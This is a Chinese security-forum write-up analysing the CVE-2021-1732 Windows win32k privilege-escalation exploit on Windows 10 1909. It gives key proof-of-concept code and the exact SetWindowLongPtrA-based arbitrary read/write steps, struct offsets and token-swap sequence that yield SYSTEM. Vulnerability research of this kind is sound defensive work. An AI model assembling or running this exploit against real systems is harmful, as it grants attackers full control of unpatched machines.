> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-271303.htm)

> [原创]CVE-2021-1732 EXP Win10_1909 KaLendsi 版本分析

[](#1、前言)1、前言
=============

1.1 概述
------

CVE-2021-1732 是蔓灵花（BITTER）APT 组织在某次被披露的攻击行动中使用的 0day 漏洞，该高危漏洞可以在本地将普通用户进程的权限提升至最高的 SYSTEM 权限。  
目前，CVE-2021-1732，主要有两个版本：一个是 Kernel Killer 在 Windows 10 Version 1809 for x64 上的版本，另一个是 KaLendsi 在 Windows 10 Version 1909 for x64 上的版本。  
本文的主要特点是：  
1、 以动态调试为主，静态分析为辅；  
2、 不再重复进行详细的理论介绍，只挑选 EXP 涉及的部分进行简单说明；  
3、 本文介绍 KaLendsi 的 1909 版本；  
4、 通过调试 EXP 代码分析漏洞原理；  
5、 修改了原来版本的一些冗余代码，并增加了一些调试代码。  
所以，阅读本文之前，一定要先阅读下面两个网址内容：  
https://www.anquanke.com/post/id/241804#h3-12  
https://bbs.pediy.com/thread-266362.htm

1.2 受影响版本
---------

Windows Server, version 20H2 (Server Core Installation)  
Windows 10 Version 20H2 for ARM64-based Systems  
Windows 10 Version 20H2 for 32-bit Systems  
Windows 10 Version 20H2 for x64-based Systems  
Windows Server, version 2004 (Server Core installation)  
Windows 10 Version 2004 for x64-based Systems  
Windows 10 Version 2004 for ARM64-based Systems  
Windows 10 Version 2004 for 32-bit Systems  
Windows Server, version 1909 (Server Core installation)  
Windows 10 Version 1909 for ARM64-based Systems  
Windows 10 Version 1909 for x64-based Systems  
Windows 10 Version 1909 for 32-bit Systems  
Windows Server 2019 (Server Core installation)  
Windows Server 2019  
Windows 10 Version 1809 for ARM64-based Systems  
Windows 10 Version 1809 for x64-based Systems  
Windows 10 Version 1809 for 32-bit Systems  
Windows 10 Version 1803 for ARM64-based Systems  
Windows 10 Version 1803 for x64-based Systems

[](#2、poc分析)2、POC 分析
====================

2.1 漏洞流程图
---------

![](https://bbs.pediy.com/upload/attach/202201/945611_NGVF8H99HR5MMP6.png)  
通过上图可知，Ring3 调用 CreateWindowsEx 时，进入 Ring0 后，又返回 Ring3 申请内存空间，此时对函数_xxxClientAllocWindowsClassExtraBytes 进行 HOOK，通过调用 NtUserConsoleControl 改变其为 offset 模式，然后返回恶意地址。这就是漏洞成因，是利用的关键。图片来源：https://bbs.pediy.com/thread-266362.htm。  
因此，该漏洞的实质就是，在创建一个带扩展内存的窗口时，内核中 xxxClientAllocWindowClassExtraBytes 的应用层回调对来自应用层返回的数据校验不严导致，通过 hook xxxClientAllocWindowClassExtraBytes，并在 hook 函数中调用 NtUserConsoleControl/NtCallbackReturn 可以将目标窗口的 poi(tagWND+0x28)+0x128 位置设置为任意 offset，从而导致越界写入。

 

##2.2 POC 关键代码

```
HWND    g_hWndMagic = CreateWindowExW(
        0x08000000u,//dwExStyle = WS_EX_NOACTIVATE
        (LPCWSTR)(unsigned __int16)g_lpWcxMagic,
        L"somewnd",
        0x20000000u,//dwStyle = WS_MINIMIZE
        0,
        0,
        0,
        0,
        0,
        CreateMenu(),
        GetModuleHandleW(0),
        0);

```

```
DWORD64  g_newxxxClientAllocWindowClassExtraBytes(DWORD64* a1)
{
    DWORD64 dwTemp = *a1;
    if (dwTemp == g_nRandom)
    {
        g_offset_0x1 = 1;
        //从最小的地址暴力搜索
        HWND hwndMagic = GuessHwnd(&g_qwMinBaseAddress, g_qwRegionSize);//找到的是magicClass的HWND
        printf("MagciHwnd==%p\r\n", hwndMagic);
        if (hwndMagic)
        {
            Int_3();
            QWORD hwndMagicWNDk = (QWORD)g_pfnHmValidateHandle(hwndMagic, 1);
            printf("MagciHwnd pExtraBytes Before NtUserConsoleControl == %x\r\n", *(DWORD*)(hwndMagicWNDk + 0x128));
            g_pfnNtUserConsoleControl(6, &hwndMagic, 0x10);
            printf("MagciHwnd pExtraBytes After NtUserConsoleControl == %x\r\n", *(DWORD*)(hwndMagicWNDk + 0x128));
            QWORD qwRet = g_Thrdeskhead_cLockobj_Min;
            g_pfnNtCallbackReturn(&qwRet, 24, 0);
        }
    }
    DWORD64 dwTest = *((PULONG64) * (a1 - 11));
    return g_oldxxxClientAllocWindowClassExtraBytes(a1);
}
 
HWND GuessHwnd(QWORD* pBaseAddress, DWORD dwRegionSize)
{
    QWORD qwBaseAddressBak = *pBaseAddress;
    QWORD qwBaseAddress = *pBaseAddress;
    DWORD dwRegionSizeBak = dwRegionSize;
    HWND hwndMagicWindow = nullptr;
    do
    {
        while (*(WORD*)qwBaseAddress != g_nRandom & dwRegionSize > 0)
        {
            qwBaseAddress += 2;
 
            dwRegionSize--;
        }
        //获取不到才会走下面的步骤
        //(-50+6)*4=-2C*4=-B0 ，c8-b0=0x18，说明ptagWNDk的0x18偏移dwStyle是0x8000000
        if (*(DWORD*)((DWORD*)qwBaseAddress + (0x18 >> 2) - (0xc8 >> 2)) != 0x8000000)
        {
            qwBaseAddress = qwBaseAddress + 4;
            QWORD qwSub = qwBaseAddressBak - qwBaseAddress;
            dwRegionSize = dwRegionSizeBak + qwSub;
        }
        hwndMagicWindow = (HWND) * (DWORD*)(qwBaseAddress - 0xc8);//qwBaseAddress现在指向cbWndExtra，减去0xc8，刚好等于hwnd
        if (hwndMagicWindow)
        {
            break;
        }
 
    } while (true);
 
    return hwndMagicWindow;
}

```

上面是 POC 关键代码，可以看到首先调用 CreateWindowsExW 创建 Magic 窗口，然后 HOOK ClientAllocWindowClassExtraBytes 函数，通过在内存中暴力搜索 Magic 窗口的句柄值之后，返回一个 0xFFFFFF00 地址，再调用：

```
DWORD dwRet = SetWindowLongW(g_hWndMagic, 0x128, g_Thrdeskhead_cLockobj_Min);

```

触发漏洞。

2.3 POC 运行结果
------------

反编译 xxxSetWindowLong 出现异常时的代码，分析可见关于 SetWindowsLong 存在两种寻址模式，一种是直接寻址，一种是偏移寻址，图中的 ptagWNDk+0x128 就是 pExtraBytes，直接寻址时它是地址；偏移寻址时它是相对于桌面堆基址的偏移量。POC 代码就是将其直接寻址模式，改为偏移寻址，触发的漏洞。如下图所示。  
![](https://bbs.pediy.com/upload/attach/202201/945611_4BTYJSYV7FZN3XW.png)  
运行 POC，出现异常：  
![](https://bbs.pediy.com/upload/attach/202201/945611_QKGWR2TS3VDGNJR.png)  
从上图可以看出，POC 运行之后，rdx 就是我们在代码里面设置的 NtCallBackReturn 的 0Xffffff00，在 xxxSetWindowLong 偏移 0x110、0x113，可以看到，POC 运行之后，rdx 就是我们在代码里面设置的 NtCallBackReturn 的 0Xffffff00，在 xxxSetWindowLong 偏移 0x110、0x113，如下图所示：  
![](https://bbs.pediy.com/upload/attach/202201/945611_8UD5VSC8AG4BAKK.png)  
说明我们现在出于直接寻址模式，桌面堆基址 + 设置的偏移 = 目标地址，这就意味着有存在任意地址任意写的可能。

[](#3、exp分析)3、EXP 分析
====================

3.1 tagWND 结构体
--------------

该结构体在 win7 之后就没有符号文件了，需要自己分析。tagWND 结构体参考了 https://www.anquanke.com/post/id/241804#h3-12。  
主要区别是：  
1、在 1909 版本下，tagWND 的结构体稍微有所变化，本文对变化进行了更新，且更正了之前网址对 dwStyle 结构体定义出现的错误。  
2、对 spMenu 的结构体，根据 KalenDashi 的 EXP 的构造进行了重新分析。  
下面列出 tagWND 结构体与漏洞相关的字段，（一个 “Tab 缩进 + 偏移量” 表示一次父级的值加偏移后访存）。

```
ptagWND(user layer)
    0x10 unknown
        0x00 pTEB
            0x220 pEPROCESS(of current process)
    0x18 unknown
        0x80 kernel desktop heap base
    0x28 ptagWNDk(kernel layer)
        0x00 hwnd
        0x08 kernel desktop heap base offset
        0x18 dwExStyle
        0x1C  dwStyle
        0x58 Window Rect left
        0x5C Window Rect top
        0x98 spMenu(uninitialized)
        0xC8 cbWndExtra
        0xE8 dwExtraFlag （是寻址模式，还是offset模式）
        0x128 pExtraBytes
    0xA8 ref_g_pMem4(spMenu)(根据EXP代码分析)
        0x00 hMenu
        0x18 unknown0
            0x100 unknown
                0x00 pEPROCESS(of current process)
        0x50 ptagWND
        0x58 rgItems
            0x00 unknown(for exploit)
        0x98 ref_g_pMem3
            0x00 ref_g_pMem1
                0x28 ref_g_pMem2
                        0x2C cItems(for check)
        0x40 unknown1
        0x44 unknown2
        0x58 ref_g_pMem5
                     0x00 DestAddr-0x40

```

3.2 动态分析
--------

### 3.2.1 内存布局静态分析

内存布局有两种思路  
1）第一种是 kk 的思路。申请 50 个窗口，然后释放其中的 48 个，最后再申请一个新窗口。要满足 1 个条件：窗口 0 的扩展内存地址要小于窗口 1 的地址，如果不满足，则重新申请，直到 5 次之后还不满足，则退出。新申请窗口的 ptagWNDk 地址会复用前面 48 个窗口的地址，所以可以根据前面 48 个窗口的 ptagWNDk 获取新窗口的地址。  
2）第二种是 KaLendsi 的思路。申请 10 个窗口，然后释放其中的 8 个。剩余的 2 个比较 ptagWNDk 地址，大的为窗口 Max，小的为窗口 Min。新申请的为 Magic 窗口，它会占用之前释放窗口的内存。内存布局如下：  
![](https://bbs.pediy.com/upload/attach/202201/945611_4Z8ZT8CZPT3XS8W.png)

### 3.2.2 任意写动态调试

#### 3.2.2.1 任意写第一步

EXP 代码第 275 行~ 317 行、350 行~ 363 行执行完之后，Magic 窗口内存占用如下。  
![](https://bbs.pediy.com/upload/attach/202201/945611_XZ5EUMEWGYVVR3Z.png)  
![](https://bbs.pediy.com/upload/attach/202201/945611_82AJ6VBS3ZK5XNQ.png)  
由上图可见，hWndMagic 的 tagWNDk 确实是 0x2416e8dd5c0，但是 g_hWndMagic 已经是 0x70342 了，而不是原来的 0x50354。  
在代码第 366 行断点，此时，窗口 Min、窗口 Max、窗口 Magic 的 tagWNDk 如下：  
![](https://bbs.pediy.com/upload/attach/202201/945611_28S65R73SGBFNFQ.png)  
图 3.2 窗口 Min 的 tagWNDk  
![](https://bbs.pediy.com/upload/attach/202201/945611_86727H4445BRUZ2.png)  
图 3.3 窗口 Max 的 tagWNDk  
![](https://bbs.pediy.com/upload/attach/202201/945611_KWJCEQNKZ8WFWTN.png)  
图 3.4 窗口 Magic 的 tagWNDk  
由图 3.2~3.4 可知：  
1）桌面堆的基址是：0x2416e8d0000。（反推计算）  
2）hwnMagicWNDk，也就是窗口 Magic 的 pExtraBytes 是 0xf550。  
3）桌面堆基址 + 窗口 Magic 的偏移等于：0x2416e8d0000+0xf550 = 0x2416e8df550。  
4）由上面图可知，firstEntryDesktop_Min，也就是窗口 0 的地址正好是 0x241`6e8df550，意味着，现在窗口 Magic 的扩展内存指向了窗口 Min，可以改变窗口 Min 的 WND 属性。  
**注意：**这里的桌面堆基址只是表示应用层的基址是这个地址，并不是内核层的桌面堆基址，必须修改内核层数据，才能达到任意写的目的。  
在 g_newxxxClientAllocWindowClassExtraBytes 时，EXP 里面直接比较 0x800000，是正确的，此时 Magic 窗口的内存布局如下：  
![](https://bbs.pediy.com/upload/attach/202201/945611_6BWQ797FJPEQHNK.png)  
但是函数返回之后，实际值等于 0x08000100。通过内存布局，也可以看出，tagWNDk 的 0x18 是 dwExStyle，0x1C 是 dwStyle。这是其他地方介绍这个字段时的错误之处，现在纠正过来。

#### 3.2.2.2 第二步，让窗口 Min 的 pExtraBytes 指向自己的 ptagWNDk

需要修改两个地方：  
1）一个是 cbWndExtra 为 0xFFFFFFFF，使得原来只能 32 字节的写范围，扩大到 0xFFFFFFFF；  
2）修改窗口 Min 的 pExtraBytes 指向自己；  
![](https://bbs.pediy.com/upload/attach/202201/945611_J6X59VBR9U8QNHH.png)  
图 3.6 窗口 Min 的 pExtraBytes 指向自己  
由上图可知：  
1）由第一步可知，此时 Magic 窗口的 pExtraBytes 指向的是窗口 Min 的 ptagWNDk，执行 SetWindowLongW(g_hWndMagic, offset_0xc8, 0xFFFFFFF) 后，窗口 Min 的 cbWndExtra 被修改；  
2）执行 SetWindowLongW(g_hWndMagic, offset_0x128, g_Thrdeskhead_cLockobj_Min) 后，窗口 Min 的 pExtraBytes 被修改成指向自己（堆基址 + 0xf550=0x241`6e8f550）。

#### 3.2.2.3 第三步：通过窗口 Min 修改窗口 Max 的 pExtraBytes：

在 EXP 代码第 436 行断点，可以得到此时窗口 Max 的内存布局，如下图：  
![](https://bbs.pediy.com/upload/attach/202201/945611_G2KPR825DN2Z6R3.png)  
由上图可知，在调用：  
SetWindowLongPtrA(hWndMin, Thrdeskhead_cLockboj_Max + offset_0x128 - g_Thrdeskhead_cLockobj_Min, qwMyTokenAddr) 后，  
窗口 Max 的 pExtraBytes 指向了当前进程的 Token 地址，再调用;  
SetWindowLongPtrA(g_hWndMax, 0, dwSystemToken);  
就把系统的 Token 赋值给了当前进程。  
窗口 Max 处于直接寻址模式，它的 pExtraBytes 地址等于 0xffffaa84`5da693e0，执行之后，可以看到，该地址的值确实和系统的 Token 值 0xffff97831c00629f 相等。提权目的已经达到。  
但是有个问题，系统的 Token 和系统的 Token 地址是怎么得到的呢？这就涉及到另外一个问题，任意地址读了。

### 3.2.3 任意地址读

#### 3.2.3.1 第一步：设置窗口 Max 的 WS_CHILD 属性

因为任意地址读第二步，需要调用：  
g_qwExpLoit = SetWindowLongPtrA(g_hWndMax, -12, g_pMem4);  
逆向代码如下：  
![](https://bbs.pediy.com/upload/attach/202201/945611_J26G293BN5CAVVE.png)  
图 3.8 设置虚假 Menu 时的逆向代码  
由上图可知，调用该函数如果要设置成功，则需要窗口 Max 要包含 WS_CHILD 属性。所以，首先调用:  
SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk ^ 0x4000000000000000);  
设置窗口 Max 包含 WS_CHILD 属性。

#### 3.2.3.2 第二步：泄漏窗口 Max 的 Menu

由图 3.8 可知，在函数  
g_qwExpLoit = SetWindowLongPtrA(g_hWndMax, -12, g_pMem4) 中，  
实际取的是最高位 0x4C，所以 0x4C&0xC0 = 0x40 了。  
4 的二进制 0100 ，C 的二进制 1100，所以实际是取的第 3bit 位，而不是整个数值。比如，是 0x4C，第 3bit 位是 1，其余是 0，就是 WS_WHILD，同样的，24c00000，第 2bit 位 2，就是 WS_MINIMIZE。  
执行  
SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max - g_Thrdeskhead_cLockobj_Min, g_qwrpdesk ^ 0x4000000000000000);  
g_qwExpLoit = SetWindowLongPtrA(g_hWndMax, -12, g_pMem4);  
之后，窗口 Max 的内存如下图。g_qwExpLoit 就是窗口 Max 的 Menu 地址。通过该地址，就可以获取想要的关键数据了。  
由图 3.9 可知，正如分析的那样，窗口 Max 的 spMenu 位置，已经被赋值成了 g_pMem4 的地址，且其 dwStyle 位置确实已经是 0x4C。  
图 3.10 展示了 g_qwExpLoit 的内存数据，这里的 g_qwExpLoit 就是 tagWND 结构体里面的 ref_g_pMem4(spMenu)，也就是 Menu 的数据。从图 3.10 可知，其内存布局和之前定义的 tagWND 结构体完全对应，更重要的是，注意左面的地址，已经是内核地址，展示出来的窗口 Max 的内存数据和图 3.9 是一样的，一个是 0xfffffxxxxxxxx 开始的内核地址，一个是 0x00000xxxxxxx 开始的应用层地址。  
最后就是通过 GetMenuBarInfo 读取这里的内核数据，实现提权的。  
![](https://bbs.pediy.com/upload/attach/202201/945611_TB2TKT5RG4AK6XE.png)  
图 3.9 泄漏窗口 Max 的 Menu 时窗口 Max 内存布局  
![](https://bbs.pediy.com/upload/attach/202201/945611_8TKJ9R8HQ4NCA9M.png)  
图 3.10 Menu 的内存布局

#### 3.2.3.3 任意读第三步：移除窗口 Max 的 WS_CHILD 属性

因为获取到泄漏的 Menu 地址后，实际是通过 GetMenuBarInfo 读取需要的数据的。而通过 GetMenuBarInfo 读取数据时，窗口是不能有是 WS_CHILD 属性。所以需要执行：  
SetWindowLongPtrA(hWndMin, offset_0x18 + Thrdeskhead_cLockboj_Max -g_Thrdeskhead_cLockobj_Min, g_qwrpdesk);  
恢复窗口的 WS_CHILD 属性。  
![](https://bbs.pediy.com/upload/attach/202201/945611_GTN7G74SBQ2JEU2.png)  
图 3.10 恢复窗口 Max 的 WS_CHILD 属性时的内存  
![](https://bbs.pediy.com/upload/attach/202201/945611_P2FYWPNQJNCKB3A.png)  
由上图可知，一共有 3 个检查点、2 个构造点、2 个取值点，具体细节参考 EXP 源码。EXP 原来有两行是多余的：  
1、_ref_g_pMem1 = 0x88888888;  
2、_(QWORD*)(ref_g_pMem3 + 8) = 16;  
可以删除。

[](#4、提权复现)4、提权复现
=================

![](https://bbs.pediy.com/upload/attach/202201/945611_SC9PFSFQ5XD4XH4.png)

[](#5、代码)5、代码
=============

EXP 代码见附件，有我的注释和修改，相信对你有所帮助。

[【公告】看雪团队招聘安全工程师，将兴趣和工作融合在一起！看雪 20 年安全圈的口碑，助你快速成长！](https://job.kanxue.com/position-read-1104.htm)

最后于 1 小时前 被 ExploitCN 编辑 ，原因：

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#Windows](forum-150-1-160.htm)

上传的附件：

*   [ExploitTest.cpp](javascript:void(0)) （18.66kb，3 次下载）